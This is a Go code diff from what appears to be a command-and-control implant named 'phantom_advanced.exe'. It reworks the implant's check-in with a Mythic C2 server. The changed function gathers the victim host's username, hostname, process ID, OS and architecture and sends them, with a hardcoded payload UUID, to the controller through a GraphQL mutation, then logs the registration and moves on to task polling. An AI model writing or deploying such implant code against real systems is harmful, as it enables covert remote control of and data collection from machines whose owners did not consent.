@@ -305,26 +305,40 @@ func registerWithMythic() error {
         user, _ := user.Current()
         
         query := `
-        mutation registerCallback($input: registerCallbackInput!) {
-                registerCallback(input: $input) {
-                        callback_uuid
-                        agent_callback_id
+        mutation createCallback($payload_uuid: String!, $c2_profile: String!, $user: String!, $host: String!, $pid: Int!, $ip: String!, $external_ip: String!, $process_name: String!, $integrity_level: Int!, $os: String!, $domain: String!, $architecture: String!) {
+                createCallback(
+                        payload_uuid: $payload_uuid,
+                        c2_profile: $c2_profile,
+                        user: $user,
+                        host: $host,
+                        pid: $pid,
+                        ip: $ip,
+                        external_ip: $external_ip,
+                        process_name: $process_name,
+                        integrity_level: $integrity_level,
+                        os: $os,
+                        domain: $domain,
+                        architecture: $architecture
+                ) {
+                        status
+                        id
+                        error
                 }
         }`
         
         variables := map[string]interface{}{
-                "input": map[string]interface{}{
-                        "user":         user.Username,
-                        "host":         hostname,
-                        "pid":          os.Getpid(),
-                        "ip":           "192.168.1.100",
-                        "external_ip":  "203.0.113.1",
-                        "process_name": "phantom_advanced.exe",
-                        "integrity_level": 2,
-                        "os":           fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH),
-                        "domain":       "WORKGROUP",
-                        "architecture": runtime.GOARCH,
-                },
+                "payload_uuid":     "9df7dfc4-f21d-4b03-9962-9f3272669b85",
+                "c2_profile":       "HTTP",
+                "user":             user.Username,
+                "host":             hostname,
+                "pid":              os.Getpid(),
+                "ip":               "192.168.1.100",
+                "external_ip":      "203.0.113.1",
+                "process_name":     "phantom_advanced.exe",
+                "integrity_level":  2,
+                "os":               fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH),
+                "domain":           "WORKGROUP",
+                "architecture":     runtime.GOARCH,
         }
         
         resp, err := makeGraphQLRequest(query, variables)
@@ -337,22 +351,24 @@ func registerWithMythic() error {
         }
         
         if data, ok := resp.Data.(map[string]interface{}); ok {
-                if registerData, ok := data["registerCallback"].(map[string]interface{}); ok {
-                        if uuid, ok := registerData["callback_uuid"].(string); ok {
-                                agentID = uuid
-                        }
-                        if cbID, ok := registerData["agent_callback_id"].(string); ok {
-                                callbackID = cbID
+                if createData, ok := data["createCallback"].(map[string]interface{}); ok {
+                        if status, ok := createData["status"].(string); ok && status == "success" {
+                                if id, ok := createData["id"].(string); ok {
+                                        callbackID = id
+                                        agentID = id
+                                        logEvent("✓ SUCCESSFULLY REGISTERED WITH MYTHIC!")
+                                        logEvent(fmt.Sprintf("Callback ID: %s", callbackID))
+                                        return nil
+                                }
+                        } else {
+                                if errorMsg, ok := createData["error"].(string); ok {
+                                        return fmt.Errorf("registration failed: %s", errorMsg)
+                                }
                         }
                 }
         }
         
-        logEvent("✓ SUCCESSFULLY REGISTERED WITH MYTHIC!")
-        logEvent(fmt.Sprintf("Callback ID: %s", callbackID))
-        logEvent(fmt.Sprintf("Agent ID: %s", agentID))
-        logEvent("Agent ready - commands will be processed")
-        
-        return nil
+        return fmt.Errorf("unexpected response format")
 }
 
 func checkForTasks() error {
